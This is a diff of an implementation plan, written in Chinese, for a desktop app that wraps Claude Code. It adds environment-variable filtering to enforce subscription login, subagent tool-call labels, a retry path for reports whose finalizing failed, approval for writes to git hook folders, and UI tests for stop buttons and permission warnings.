@@ -3742,8 +4085,47 @@ describe('detectClaude', () => {
       loggedIn: true,
       subscriptionType: 'max',
       email: 'a@b',
-      error: undefined
+      error: undefined,
+      ignoredEnv: []
     })
+  })
+
+  test('API key、其他驗證方式與端點的環境變數不傳給 claude，並回報忽略了哪些', async () => {
+    const env = {
+      PATH: '/usr/bin',
+      ANTHROPIC_API_KEY: 'sk-ant-x',
+      ANTHROPIC_AUTH_TOKEN: 't',
+      ANTHROPIC_BASE_URL: 'https://proxy.example',
+      CLAUDE_CODE_USE_BEDROCK: '1',
+      CLAUDE_CODE_USE_VERTEX: '1',
+      CLAUDE_CODE_USE_FOUNDRY: '1',
+      CLAUDE_CODE_OAUTH_TOKEN: 'oauth'
+    }
+    const seen: (ExecOptions | undefined)[] = []
+    const exec: Exec = async (cmd, args, opts) => {
+      if (cmd === '/c') seen.push(opts)
+      return args.includes('auth') ? '{"loggedIn":true}' : '1'
+    }
+    const s = await detectClaude(exec, '/c', env)
+    expect(s.ignoredEnv).toEqual([
+      'ANTHROPIC_API_KEY',
+      'ANTHROPIC_AUTH_TOKEN',
+      'ANTHROPIC_BASE_URL',
+      'CLAUDE_CODE_USE_BEDROCK',
+      'CLAUDE_CODE_USE_VERTEX',
+      'CLAUDE_CODE_USE_FOUNDRY'
+    ])
+    expect(seen).toHaveLength(2)
+    for (const opts of seen)
+      expect(opts?.env).toEqual({ PATH: '/usr/bin', CLAUDE_CODE_OAUTH_TOKEN: 'oauth' })
+    // 空字串不算設定
+    expect((await detectClaude(exec, '/c', { ANTHROPIC_API_KEY: '' })).ignoredEnv).toEqual([])
+  })
+
+  test('claudeEnv 是複本：不改動原本的環境變數', () => {
+    const env = { PATH: '/bin', ANTHROPIC_API_KEY: 'k' }
+    expect(claudeEnv(env)).toEqual({ PATH: '/bin' })
+    expect(env.ANTHROPIC_API_KEY).toBe('k')
   })
 
   test('使用設定指定的路徑', async () => {
@@ -3959,6 +4341,33 @@ import type { ClaudeStatus } from '@shared/types'
 export interface ExecOptions {
   /** 逾時毫秒數，逾時會終止整個 process group 並拒絕 */
   timeoutMs?: number
+  /** 子程序的環境變數（預設 process.env） */
+  env?: NodeJS.ProcessEnv
+}
+
+/**
+ * 會讓 Claude Code 改用 API key、其他驗證方式或其他端點的環境變數。Harness 一律使用本機
+ * Claude Code 的訂閱登入：啟動 claude（偵測狀態與每一輪對話）時都拿掉這些變數。
+ */
+export const IGNORED_CLAUDE_ENV = [
+  'ANTHROPIC_API_KEY',
+  'ANTHROPIC_AUTH_TOKEN',
+  'ANTHROPIC_BASE_URL',
+  'CLAUDE_CODE_USE_BEDROCK',
+  'CLAUDE_CODE_USE_VERTEX',
+  'CLAUDE_CODE_USE_FOUNDRY'
+] as const
+
+/** 傳給 claude 的環境變數：env 的複本，拿掉 IGNORED_CLAUDE_ENV */
+export function claudeEnv(env: NodeJS.ProcessEnv = process.env): NodeJS.ProcessEnv {
+  const out = { ...env }
+  for (const k of IGNORED_CLAUDE_ENV) delete out[k]
+  return out
+}
+
+/** env 裡有設定（非空）、會被忽略的變數，設定頁用來說明 */
+export function ignoredClaudeEnv(env: NodeJS.ProcessEnv = process.env): string[] {
+  return IGNORED_CLAUDE_ENV.filter((k) => !!env[k])
 }
 
 export type Exec = (cmd: string, args: string[], opts?: ExecOptions) => Promise<string>
@@ -3967,10 +4376,14 @@ export type Exec = (cmd: string, args: string[], opts?: ExecOptions) => Promise<
  * 執行指令並回傳 stdout；非 0 結束時若有 stdout 也回傳（`claude auth status` 未登入時會這樣）。
  * stdin 為空，避免互動式 shell 或指令等待輸入而卡住啟動流程。
  */
-export const execCapture: Exec = (cmd, args, { timeoutMs = 15_000 } = {}) =>
+export const execCapture: Exec = (cmd, args, { timeoutMs = 15_000, env } = {}) =>
   new Promise((resolve, reject) => {
     // detached：自成 process group，逾時可連同孫程序一起終止
-    const child = spawn(cmd, args, { stdio: ['ignore', 'pipe', 'pipe'], detached: true })
+    const child = spawn(cmd, args, {
+      stdio: ['ignore', 'pipe', 'pipe'],
+      detached: true,
+      env: env ?? process.env
+    })
     let stdout = ''
     let stderr = ''
     let settled = false
@@ -4007,8 +4420,22 @@ const shell = () => process.env.SHELL || '/bin/zsh'
 /**
  * 偵測 claude 的路徑、版本與登入狀態。
  * 啟動時必須先執行 applyLoginShellPath 再呼叫這裡：`-lc` 不讀 .zshrc，要靠繼承來的 PATH 才找得到 claude。
+ * 執行 claude 時拿掉 IGNORED_CLAUDE_ENV（與對話時相同），回報的登入狀態才是訂閱登入的狀態。
  */
-export async function detectClaude(exec: Exec, explicitPath?: string): Promise<ClaudeStatus> {
+export async function detectClaude(
+  exec: Exec,
+  explicitPath?: string,
+  env: NodeJS.ProcessEnv = process.env
+): Promise<ClaudeStatus> {
+  const status = await detectWith(exec, explicitPath, claudeEnv(env))
+  return { ...status, ignoredEnv: ignoredClaudeEnv(env) }
+}
+
+async function detectWith(
+  exec: Exec,
+  explicitPath: string | undefined,
+  env: NodeJS.ProcessEnv
+): Promise<ClaudeStatus> {
   let path = explicitPath
   if (!path) {
     try {
@@ -4029,8 +4456,8 @@ export async function detectClaude(exec: Exec, explicitPath?: string): Promise<C
   let version: string
   let authOut: string
   try {
-    version = (await exec(path, ['--version'])).trim()
-    authOut = await exec(path, ['auth', 'status'])
+    version = (await exec(path, ['--version'], { env })).trim()
+    authOut = await exec(path, ['auth', 'status'], { env })
   } catch (e) {
     return {
       found: true,
@@ -4803,13 +5230,32 @@ describe('mapMessage', () => {
       { type: 'tool_call', id: 'tu1', name: 'Read', input: { file_path: 'a' } }
     ])
   })
-  test('子代理的訊息略過', () => {
+  test('子代理的工具呼叫標成 subagent；子代理的文字與工具結果略過', () => {
     expect(
       mapMessage(
         m({
           type: 'assistant',
           parent_tool_use_id: 'x',
-          message: { content: [{ type: 'text', text: 'hi' }] }
+          error: 'rate_limit',
+          message: {
+            content: [
+              { type: 'text', text: 'hi' },
+              { type: 'tool_use', id: 'tu9', name: 'Grep', input: { pattern: 'lockout' } }
+            ]
+          }
+        })
+      )
+    ).toEqual([
+      { type: 'tool_call', id: 'tu9', name: 'Grep', input: { pattern: 'lockout' }, subagent: true }
+    ])
+    expect(
+      mapMessage(
+        m({
+          type: 'user',
+          parent_tool_use_id: 'x',
+          message: {
+            content: [{ type: 'tool_result', tool_use_id: 'tu9', is_error: true, content: 'x' }]
+          }
         })
       )
     ).toEqual([])
@@ -5213,7 +5659,14 @@ export type TurnEnd = {
 export type RunnerEvent =
   | { type: 'session'; sessionId: string }
   | { type: 'assistant_text'; text: string }
-  | { type: 'tool_call'; id: string; name: string; input: Record<string, unknown> }
+  | {
+      type: 'tool_call'
+      id: string
+      name: string
+      input: Record<string, unknown>
+      /** 子代理（Agent／Task 工具）裡的呼叫 */
+      subagent?: boolean
+    }
   | { type: 'tool_result'; id: string; isError: boolean; text: string }
   | TurnEnd
   | { type: 'notice'; message: string }
@@ -5301,7 +5754,22 @@ export function mapMessage(raw: SDKMessage): MappedEvent[] {
         ? [{ type: 'session', sessionId: m.session_id }]
         : []
     case 'assistant': {
-      if (m.parent_tool_use_id) return []
+      const content = Array.isArray(m.message?.content) ? m.message.content : []
+      // 子代理的訊息：只留工具呼叫（讓使用者看得到它讀了什麼、跑了什麼），文字與錯誤不顯示
+      if (m.parent_tool_use_id)
+        return content.flatMap((b): MappedEvent[] =>
+          b.type === 'tool_use'
+            ? [
+                {
+                  type: 'tool_call',
+                  id: b.id ?? '',
+                  name: b.name ?? '',
+                  input: (b.input ?? {}) as Record<string, unknown>,
+                  subagent: true
+                }
+              ]
+            : []
+        )
       const events: MappedEvent[] = m.error
         ? [
             {
@@ -5310,7 +5778,6 @@ export function mapMessage(raw: SDKMessage): MappedEvent[] {
             }
           ]
         : []
-      const content = Array.isArray(m.message?.content) ? m.message.content : []
       for (const b of content) {
         if (b.type === 'text' && b.text?.trim())
           events.push({ type: 'assistant_text', text: b.text })
@@ -5675,6 +6142,7 @@ export function fakeGit(): GitLike & { calls: string[] } {
       calls.push(`worktree ${wt} ${branch} ${base}`)
     },
     commitAll: async () => 'abc123',
+    hooksPath: async () => undefined,
     diff: async () => 'diff --git a/a.ts b/a.ts\n',
     diffStats: async () => ({
       files: 1,
@@ -5985,6 +6453,7 @@ import type {
   BranchConclusion,
   Channel,
   FeedbackItem,
+  PendingReport,
   PermissionDecision,
   PermissionRequest,
   Report,
@@ -5995,6 +6464,7 @@ import type {
 } from '@shared/types'
 import { AgentRun, type QueryFn, type RunnerEvent } from '../agent/agentRun'
 import { MAIN_SYSTEM_APPEND } from '../agent/prompts'
+import { claudeEnv } from '../claude/detect'
 import type { GitLike } from '../git/gitService'
 import { hasShellOperators, matchesPattern } from '../permissions/commandPattern'
 import {
@@ -6002,7 +6472,8 @@ import {
   BUILTIN_TOOLS,
   createPermissionGate,
   createPreToolUseHook,
-  type GateContext
+  type GateContext,
+  hooksDirInside
 } from '../permissions/gate'
 import type { Repository } from '../store/repository'
 import { type HarnessToolName, type ToolSink, TURN_ENDING_TOOLS } from '../tools/harnessTools'
@@ -6385,8 +6856,13 @@ export class TaskManager {
     entries: TimelineEntry[]
   ) {
     // 等上一段執行結束的期間任務可能已被丟棄或開始收尾
-    this.assertCanSend(taskId, channel)
-    const settings = await this.d.repo.getSettings()
+    const before = this.assertCanSend(taskId, channel)
+    // repo 設定的 core.hooksPath 每一輪讀一次：在 worktree 內時，寫入那個資料夾要核准。
+    // 讀不到（git 失敗）時照常開始，husky 等常見的 hook 位置仍受保護
+    const [settings, hooksPath] = await Promise.all([
+      this.d.repo.getSettings(),
+      this.d.git.hooksPath(before.worktreePath).catch(() => undefined)
+    ])
     // 上面的 await 期間狀態可能又變了：建立執行前最後確認一次
     const t = this.assertCanSend(taskId, channel)
     const branchId = branchIdOf(channel)
@@ -6400,6 +6876,7 @@ export class TaskManager {
     const gateCtx: GateContext = {
       getPhase: () => (branch ? 'branch' : phaseOf(this.task(taskId).status)),
       worktreePath: t.worktreePath,
+      hooksDir: hooksDirInside(t.worktreePath, hooksPath),
       // 每次判斷都讀目前的設定：設定頁移除允許的指令後，進行中的這一輪也立即適用
       getAllowedPatterns: () => [
         ...this.d.repo.cachedSettings().alwaysAllowedCommands,
@@ -6436,11 +6913,12 @@ export class TaskManager {
       // 專案設定的 allow 規則會在 canUseTool 之前生效；硬性規則放在 PreToolUse hook 才不會被繞過
       hooks: { PreToolUse: [{ hooks: [createPreToolUseHook(gateCtx)] }] },
       pathToClaudeCodeExecutable: this.d.getClaudePath(),
+      // API key、其他驗證方式與端點的變數不傳（claudeEnv）：一律使用 Claude Code 的訂閱登入。
       // claude.ai 帳號上的連接器（Gmail、Notion…）不載入：PermissionGate 一律拒絕，只會佔用 context，
       // Claude 還會在回覆裡提到它們。
       // 呼叫提問、規格、結論、報告工具後安靜結束這一輪是對的：Claude Code 不要再催 Claude 寫一段話
       env: {
-        ...process.env,
+        ...claudeEnv(),
         ENABLE_CLAUDEAI_MCP_SERVERS: 'false',
         CLAUDE_CODE_TERMINAL_MCP_TOOLS: TURN_ENDING_TOOLS.join(',')
       }
@@ -6468,6 +6946,8 @@ export class TaskManager {
       } else {
         x.runState = 'running'
         x.error = undefined
+        // 整理失敗後改為繼續和 Claude 對話：放棄待整理的報告，Claude 之後會重新提交
+        x.pendingReport = undefined
       }
     }).catch(logError('儲存任務失敗'))
     await written
@@ -6546,7 +7026,12 @@ export class TaskManager {
           await this.addTimeline(taskId, {
             channel,
             kind: 'tool_call',
-            tool: { id: e.id, name: e.name, input: e.input }
+            tool: {
+              id: e.id,
+              name: e.name,
+              input: e.input,
+              ...(e.subagent ? { subagent: true } : {})
+            }
           })
         }
         return
@@ -6575,6 +7060,13 @@ export class TaskManager {
         if (!e.ok && !e.interrupted) {
           await this.update(taskId, (t) => {
             this.setRunError(t, channel, e.error || 'Claude 執行失敗')
+            // 主線這段執行以失敗結束（例如訂閱額度用盡）：和程序崩潰一樣標為發生錯誤，畫面提供「繼續」
+            if (
+              e.final &&
+              channel === 'main' &&
+              (t.runState === 'running' || t.runState === 'waiting_permission')
+            )
+              t.runState = 'error'
           })
         }
         return
@@ -6667,25 +7159,7 @@ export class TaskManager {
           if (this.task(taskId).status !== 'implementing')
             throw new Error('只有實作階段可以提交報告')
           if (this.finalizing.has(taskId)) throw new Error('報告已提交，正在整理中')
-          const run = this.runs.get(runKey(taskId, 'main'))
-          const before = this.task(taskId).runState
-          this.finalizing.add(taskId)
-          try {
-            await this.update(taskId, (t) => {
-              t.runState = 'finalizing'
-            })
-          } catch (e) {
-            // 記憶體中已改成 finalizing：還原，不然主線會一直卡在整理中
-            this.finalizing.delete(taskId)
-            this.persist(taskId, (t) => {
-              if (t.runState === 'finalizing') t.runState = before
-            })
-            throw e
-          }
-          const job: Promise<void> = this.finalizeReport(taskId, input, run).finally(() => {
-            if (this.reportJobs.get(taskId) === job) this.reportJobs.delete(taskId)
-          })
-          this.reportJobs.set(taskId, job)
+          await this.startFinalizing(taskId, { input }, this.runs.get(runKey(taskId, 'main')))
         })
     }
   }
@@ -6768,13 +7242,14 @@ export class TaskManager {
     for (const [id, r] of this.deniedToolUses) if (r === run) this.deniedToolUses.delete(id)
     for (const [id, b] of this.blockedToolUses) if (b.run === run) this.blockedToolUses.delete(id)
   }
-  private async finalizeReport(taskId: string, input: ReportInput, run?: AgentRun) {
-    void [taskId, input, run]
+  private async startFinalizing(taskId: string, pending: PendingReport, run?: AgentRun) {
+    void [taskId, pending, run]
   }
 
   // 以下成員在 Task 22–24 補上：openBranch、concludeBranch、confirmBranch、approveSpec、
   // requestSpecChanges、syncPermission、denyWaitersOf、requestApproval、resolvePermission、stop、resume、
-  // finalizeReport、getReport、submitReportFeedback、exclusive、createPullRequest、merge、discard、changedFiles
+  // startFinalizing、finalizeReport、getReport、submitReportFeedback、exclusive、createPullRequest、merge、
+  // discard、changedFiles
 }
 ```
 
@@ -7423,6 +7898,16 @@ describe('TaskManager：規格與實作', () => {
 
   async resume(taskId: string) {
     const t = this.task(taskId)
+    // 報告已提交但還沒整理完（關閉 app 時中斷、commit 或驗證指令失敗）：直接重新整理，不再呼叫 Claude
+    if (
+      t.pendingReport &&
+      t.status === 'implementing' &&
+      !this.runs.get(runKey(taskId, 'main'))?.active
+    ) {
+      this.assertCanSend(taskId, 'main')
+      await this.startFinalizing(taskId, t.pendingReport)
+      return
+    }
     // 第一輪還沒拿到 session 就中斷：沒有可續接的對話，重新送出需求
     if (!t.mainSessionId) {
       await this.send(taskId, 'main', t.request, { display: msgDisplay.resume })
@@ -8227,7 +8712,7 @@ describe('TaskManager：審查補強', () => {
 
 **Step 4: 確認失敗**
 
-**Step 5: 實作（加到 TaskManager，取代 finalizeReport stub）**
+**Step 5: 實作（加到 TaskManager，取代 startFinalizing stub）**
 
 檔頭加上 `FeedbackItem`、`Report`（`@shared/types`）、`hasShellOperators`、`matchesPattern`（`../permissions/commandPattern`）、`prBody`（`./prBody`）。
 
@@ -8243,6 +8728,37 @@ describe('TaskManager：審查補強', () => {
 ```ts
   // ───────── 報告 ─────────
 
+  /**
+   * 進入「整理報告中」並在背景整理。提交的報告先存在任務上（pendingReport），整理完成才清掉：
+   * 關閉 app 時中斷或 commit／驗證失敗後，resume() 用它直接重新整理，結果不依賴 Claude 再做一次。
+   * run 是提交報告的那段執行（重試時沒有）。
+   */
+  private async startFinalizing(taskId: string, pending: PendingReport, run?: AgentRun) {
+    const before = {
+      runState: this.task(taskId).runState,
+      pendingReport: this.task(taskId).pendingReport
+    }
+    this.finalizing.add(taskId)
+    try {
+      await this.update(taskId, (t) => {
+        t.runState = 'finalizing'
+        t.error = undefined
+        t.pendingReport = pending
+      })
+    } catch (e) {
+      // 記憶體中已改成 finalizing：還原，不然主線會一直卡在整理中
+      this.finalizing.delete(taskId)
+      this.persist(taskId, (t) => {
+        if (t.runState === 'finalizing') Object.assign(t, before)
+      })
+      throw e
+    }
+    const job: Promise<void> = this.finalizeReport(taskId, pending.input, run).finally(() => {
+      if (this.reportJobs.get(taskId) === job) this.reportJobs.delete(taskId)
+    })
+    this.reportJobs.set(taskId, job)
+  }
+
   /** 等提交報告的那段執行結束後：commit、算 diff、實跑驗證指令、存報告 */
   private async finalizeReport(taskId: string, input: ReportInput, run?: AgentRun) {
     const abort = new AbortController()
@@ -8255,9 +8771,14 @@ describe('TaskManager：審查補強', () => {
       assertNotAborted()
       const t = this.task(taskId)
       const version = t.reportVersions.length + 1
+      // 重試時沒有新的變更：沿用上一次整理已經做好的 commit
       const commit =
         (await this.d.git.commitAll(t.worktreePath, `${t.title}（Harness 報告 v${version}）`)) ??
-        undefined
+        t.pendingReport?.commit
+      if (commit !== t.pendingReport?.commit)
+        await this.update(taskId, (x) => {
+          if (x.pendingReport) x.pendingReport.commit = commit
+        })
       const [diff, stats] = await Promise.all([
         this.d.git.diff(t.worktreePath, t.baseBranch),
         this.d.git.diffStats(t.worktreePath, t.baseBranch)
@@ -8297,6 +8818,7 @@ describe('TaskManager：審查補強', () => {
         x.status = next
         x.runState = 'idle'
         x.error = undefined
+        x.pendingReport = undefined
         // 與進入 reviewing 同一步結束「整理中」，中間沒有可以插進其他操作的空檔
         this.finalizing.delete(taskId)
       })
@@ -10374,7 +10896,7 @@ export function blockImeSubmit(e: KeyLike & Pick<KeyboardEvent, 'preventDefault'
 // 共用的 UI 元件與樣式常數。這裡同時匯出 cx／TONE_TEXT／Icons 等非元件，
 // 改這個檔時 Vite 會整頁重新載入而不是 fast refresh，換來各畫面只需一個 import 來源。
 /* eslint-disable react-refresh/only-export-components */
-import type { ComponentProps, HTMLAttributes, ReactNode, SVGProps } from 'react'
+import type { ComponentProps, ReactNode, SVGProps } from 'react'
 import { extendTailwindMerge } from 'tailwind-merge'
 
 // 讓呼叫端傳入的 className 能覆蓋元件預設的 class（例如 Button 的 h-11 被 h-[42px] 取代）。
@@ -10413,10 +10935,6 @@ export function Button({
       {...p}
     />
   )
-}
-
-export function Panel({ className, ...p }: HTMLAttributes<HTMLElement>) {
-  return <section className={cx('rounded-2xl bg-surface shadow-card', className)} {...p} />
 }
 
 export type Tone =
@@ -11958,6 +12476,7 @@ import { toolSummary, userTextDisplay } from '@renderer/lib/timeline'
 import { resetStoreInternals, useStore } from '@renderer/store'
 import { BRANCH_RULES, msg } from '@shared/protocol'
 import type { TimelineEvent } from '@shared/types'
+import { sampleReport } from '../fixtures/report'
 import { makeTask } from '../fixtures/task'
 
 let seq = 0
@@ -12082,6 +12601,31 @@ describe('Timeline', () => {
     expect(screen.getByText('原因：多台機器要共享狀態')).toBeInTheDocument()
     await userEvent.click(screen.getByRole('button', { name: /規格草稿 v1/ }))
     expect(onOpenStage).toHaveBeenCalledWith('spec')
+  })
+
+  test('子代理的工具呼叫：摘要與明細都標「子代理」', async () => {
+    const sub = (id: string, name: string, input: Record<string, unknown>) =>
+      ev({ kind: 'tool_call', tool: { id, name, input, subagent: true } })
+    render(
+      <Timeline
+        task={makeTask()}
+        channel="main"
+        events={[
+          ev({ kind: 'tool_call', tool: { id: 'a1', name: 'Agent', input: { prompt: '找檔案' } } }),
+          sub('s1', 'Read', { file_path: '/tmp/wt/t1/src/a.ts' }),
+          sub('s2', 'Read', { file_path: '/tmp/wt/t1/src/b.ts' }),
+          sub('s3', 'Grep', { pattern: 'lockout' })
+        ]}
+      />
+    )
+    await userEvent.click(
+      screen.getByRole('button', { name: '子代理 1 次 · 子代理讀取 2 次 · 子代理搜尋內容 1 次' })
+    )
+    expect(screen.getByText('讀取 src/a.ts').parentElement).toHaveTextContent('子代理讀取 src/a.ts')
+    expect(screen.getByText('搜尋內容 lockout').parentElement).toHaveTextContent('子代理')
+    // 主線自己呼叫的子代理（Agent 工具）是一般的一行，不加標籤
+    const labels = screen.getAllByText('子代理')
+    expect(labels.map((l) => l.tagName)).toEqual(['CODE', 'SPAN', 'SPAN', 'SPAN'])
   })
 
   test('工具錯誤、系統訊息、報告與非分岔決策', async () => {
@@ -12269,6 +12813,28 @@ describe('RunStatus', () => {
     expect(onResume).toHaveBeenCalled()
   })
 
+  test('報告已提交、整理中斷或失敗：說明「繼續」會直接重新整理，不會再呼叫 Claude', async () => {
+    const onResume = vi.fn()
+    const pendingReport = { input: sampleReport }
+    const { rerender } = render(
+      <RunStatus task={makeTask({ runState: 'interrupted', pendingReport })} onResume={onResume} />
+    )
+    expect(screen.getByRole('alert')).toHaveTextContent(
+      '報告還沒整理完就中斷了。 按「繼續」會直接重新整理報告，不會再呼叫 Claude。'
+    )
+    rerender(
+      <RunStatus
+        task={makeTask({ runState: 'error', error: '整理報告失敗：commit 逾時', pendingReport })}
+        onResume={onResume}
+      />
+    )
+    expect(screen.getByRole('alert')).toHaveTextContent(
+      '整理報告失敗：commit 逾時 按「繼續」會直接重新整理報告，不會再呼叫 Claude。'
+    )
+    await userEvent.click(screen.getByRole('button', { name: '繼續' }))
+    expect(onResume).toHaveBeenCalled()
+  })
+
   test('執行中在常駐的 live region 顯示處理中；quiet 時不顯示', () => {
     const { rerender } = render(<RunStatus task={makeTask()} onResume={() => {}} />)
     const status = screen.getByRole('status')
@@ -12333,6 +12899,9 @@ const TOOL_LABEL: Record<string, string> = {
 export type ToolCall = NonNullable<TimelineEvent['tool']>
 
 export const toolLabel = (name: string) => TOOL_LABEL[name] ?? name
+
+/** 子代理（Agent／Task 工具）裡的工具呼叫的標籤 */
+export const SUBAGENT_LABEL = '子代理'
 
 /** worktree 內的絕對路徑顯示成相對路徑（Claude Code 的檔案工具都用絕對路徑）；其他原樣回傳 */
 export function relativeTo(root: string, p: string): string {
@@ -12862,6 +13431,7 @@ import { useMemo, useState } from 'react'
 import type { Channel, Task, TimelineEvent } from '@shared/types'
 import {
   latestQuestionEvents,
+  SUBAGENT_LABEL,
   type ToolCall,
   toolLabel,
   toolResultLabel,
@@ -12893,7 +13463,8 @@ function ToolGroup({ events, root }: { events: ToolEvent[]; root: string }) {
   const [open, setOpen] = useState(false)
   const counts = new Map<string, number>()
   for (const e of events) {
-    const l = toolLabel(e.tool.name)
+    // 子代理裡的呼叫分開計數，例如「子代理讀取 2 次」
+    const l = `${e.tool.subagent ? SUBAGENT_LABEL : ''}${toolLabel(e.tool.name)}`
     counts.set(l, (counts.get(l) ?? 0) + 1)
   }
   return (
@@ -12908,11 +13479,20 @@ function ToolGroup({ events, root }: { events: ToolEvent[]; root: string }) {
         <span aria-hidden>{open ? '▴' : '▾'}</span>
       </button>
       {open &&
-        events.map((e) => (
-          <code key={e.id} className="self-start break-all">
-            {toolSummary(e.tool, root)}
-          </code>
-        ))}
+        events.map((e) =>
+          e.tool.subagent ? (
+            <span key={e.id} className="flex items-baseline gap-1.5 self-start">
+              <span className="flex-none rounded-full bg-fill px-1.5 text-[11px] text-muted">
+                {SUBAGENT_LABEL}
+              </span>
+              <code className="break-all">{toolSummary(e.tool, root)}</code>
+            </span>
+          ) : (
+            <code key={e.id} className="self-start break-all">
+              {toolSummary(e.tool, root)}
+            </code>
+          )
+        )}
     </div>
   )
 }
@@ -13094,6 +13674,14 @@ export function RunStatus({
         : undefined
   const failed = task.runState === 'interrupted' || task.runState === 'error' || !!task.error
   const canResume = task.runState === 'interrupted' || task.runState === 'error'
+  // 報告已提交、整理被中斷或失敗：「繼續」直接重新整理（主程序的 resume），不會再呼叫 Claude
+  const retryReport = canResume && !!task.pendingReport
+  const message =
+    task.runState === 'interrupted'
+      ? retryReport
+        ? '報告還沒整理完就中斷了。'
+        : '上一次執行被中斷了。'
+      : (task.error ?? '發生錯誤')
   return (
     <>
       <LiveStatus text={!quiet && progress} className="ml-10 text-[13px]" />
@@ -13103,7 +13691,15 @@ export function RunStatus({
           className="flex items-center gap-3 rounded-xl bg-danger-soft px-3.5 py-3 text-[13px] text-danger"
         >
           <span className="flex-1">
-            {task.runState === 'interrupted' ? '上一次執行被中斷了。' : (task.error ?? '發生錯誤')}
+            {message}
+            {retryReport && (
+              <>
+                {' '}
+                <span className="text-ink-2">
+                  按「繼續」會直接重新整理報告，不會再呼叫 Claude。
+                </span>
+              </>
+            )}
           </span>
           {canResume && (
             <button
@@ -13256,6 +13852,27 @@ test('Claude 還沒在分岔回覆前不能帶回主線；執行中停用輸入'
   expect(screen.getByRole('textbox', { name: '分岔訊息' })).toBeDisabled()
   expect(screen.getByRole('button', { name: '帶回主線' })).toBeDisabled()
   expect(screen.getByText('Claude 正在回覆…')).toBeInTheDocument()
+})
+
+test('分岔執行中可以停止（只停這個分岔）；連點只送一次', async () => {
+  const { rerender } = render(<BranchPanel task={{ ...task, branches: [open] }} events={talk} />)
+  expect(screen.queryByRole('button', { name: '停止' })).not.toBeInTheDocument()
+  rerender(<BranchPanel task={{ ...task, branches: [{ ...open, running: true }] }} events={talk} />)
+  const release = holdNextCall(vi.mocked(call))
+  const stop = screen.getByRole('button', { name: '停止' })
+  await userEvent.dblClick(stop)
+  expect(vi.mocked(call).mock.calls).toEqual([['run:stop', 't1', 'branch:b2']])
+  expect(stop).toBeDisabled()
+  await release()
+  expect(stop).toBeEnabled()
+  rerender(
+    <BranchPanel
+      task={{ ...task, branches: [{ ...open, running: true }] }}
+      events={talk}
+      readOnly
+    />
+  )
+  expect(screen.queryByRole('button', { name: '停止' })).not.toBeInTheDocument()
 })
 
 test('切換分岔；已帶回的分岔只能看', async () => {
@@ -14173,7 +14790,14 @@ export function Composer({
 
 ```tsx
 // src/renderer/src/components/BranchPanel.tsx
-import { type FormEvent, type KeyboardEvent, useEffect, useRef, useState } from 'react'
+import {
+  type FormEvent,
+  type KeyboardEvent,
+  type ReactNode,
+  useEffect,
+  useRef,
+  useState
+} from 'react'
 import type { Branch, Task, TimelineEvent } from '@shared/types'
 import { call } from '../api'
 import { parseBranchSeed, stripMarkdown } from '../lib/branchDraft'
@@ -14183,6 +14807,7 @@ import { isBusy } from '../lib/stage'
 import { usePending } from '../lib/usePending'
 import { useStickToBottom } from '../lib/useStickToBottom'
 import { useStore } from '../store'
+import { StopButton } from './Composer'
 import { Markdown } from './Markdown'
 import { Button, cx, inputClass, LiveStatus } from './ui'
 
@@ -14193,8 +14818,16 @@ function statusText(b: Branch) {
   return '進行中'
 }
 
-/** 分岔的輸入框：打字的狀態留在這裡，不會讓整個面板（訊息列表）跟著重繪 */
-function BranchInput({ disabled, onSend }: { disabled: boolean; onSend: (text: string) => void }) {
+/** 分岔的輸入框：打字的狀態留在這裡，不會讓整個面板（訊息列表）跟著重繪；extra 放在輸入框右邊 */
+function BranchInput({
+  disabled,
+  onSend,
+  extra
+}: {
+  disabled: boolean
+  onSend: (text: string) => void
+  extra?: ReactNode
+}) {
   const [text, setText] = useState('')
   const submit = (e: FormEvent) => {
     e.preventDefault()
@@ -14204,8 +14837,8 @@ function BranchInput({ disabled, onSend }: { disabled: boolean; onSend: (text: s
     onSend(t)
   }
   return (
-    <form onSubmit={submit} className="flex">
-      <label className="flex flex-1">
+    <form onSubmit={submit} className="flex gap-2">
+      <label className="flex min-w-0 flex-1">
         <span className="sr-only">分岔訊息</span>
         <input
           value={text}
@@ -14213,9 +14846,10 @@ function BranchInput({ disabled, onSend }: { disabled: boolean; onSend: (text: s
           onKeyDown={blockImeSubmit}
           disabled={disabled}
           placeholder="繼續在分岔裡討論…"
-          className={cx(inputClass, 'flex-1')}
+          className={cx(inputClass, 'min-w-0 flex-1')}
         />
       </label>
+      {extra}
     </form>
   )
 }
@@ -14493,7 +15127,16 @@ export function BranchPanel({
 
           {!readOnly && b.status !== 'concluded' && (
             <div className="flex flex-col gap-2.5 px-5 pt-3.5 pb-5">
-              <BranchInput disabled={b.running} onSend={send} />
+              <BranchInput
+                disabled={b.running}
+                onSend={send}
+                // 只停這個分岔，不影響主線
+                extra={
+                  b.running && (
+                    <StopButton taskId={task.id} channel={`branch:${b.id}`} className="bg-fill" />
+                  )
+                }
+              />
               {b.status === 'concluding' ? (
                 // 看過預覽後可能又討論了幾句：可以請 Claude 重新整理結論
                 <div className="flex gap-2">
@@ -15572,6 +16215,33 @@ test('顯示指令與原因，勾選後允許並記住樣式', async () => {
   })
 })
 
+test('「本任務內都允許」的樣式範圍很廣或有危險時，顯示和設定頁一樣的提醒', async () => {
+  const { rerender } = await renderDialog()
+  expect(screen.getByRole('checkbox', { name: /本任務內都允許/ })).not.toHaveAccessibleDescription()
+  rerender(
+    <PermissionDialog
+      request={{ ...req, input: { command: 'ls -la' }, suggestedPattern: 'ls *' }}
+      cwd="/wt"
+    />
+  )
+  expect(screen.getByRole('checkbox', { name: /本任務內都允許/ })).toHaveAccessibleDescription(
+    '「ls *」會允許所有 ls 開頭的指令，範圍很廣'
+  )
+  rerender(
+    <PermissionDialog
+      request={{
+        ...req,
+        input: { command: 'sudo apt install jq' },
+        suggestedPattern: 'sudo apt install jq'
+      }}
+      cwd="/wt"
+    />
+  )
+  expect(
+    screen.getByText('「sudo apt install jq」會允許以管理員權限執行指令，請確認真的需要')
+  ).toBeInTheDocument()
+})
+
 test('沒有勾選時只允許這一次', async () => {
   await renderDialog()
   await user().click(screen.getByRole('button', { name: '允許' }))
@@ -15680,7 +16350,9 @@ test('修改受保護的檔案：顯示工具、相對路徑、說明與要寫�
   expect(screen.getByRole('dialog', { name: 'Claude 想修改這個檔案' })).toBeInTheDocument()
   expect(screen.getByText('.claude/settings.json')).toBeInTheDocument()
   expect(screen.getByText('Edit · cwd: /wt')).toBeInTheDocument()
-  expect(screen.getByText('這個檔案會影響 Claude 的權限或 git 設定')).toBeInTheDocument()
+  expect(
+    screen.getByText('這個檔案會影響 Claude 的權限、git 設定，或在 git 操作時執行的 hook')
+  ).toBeInTheDocument()
   expect(screen.getByLabelText('要寫入的內容')).toHaveTextContent(
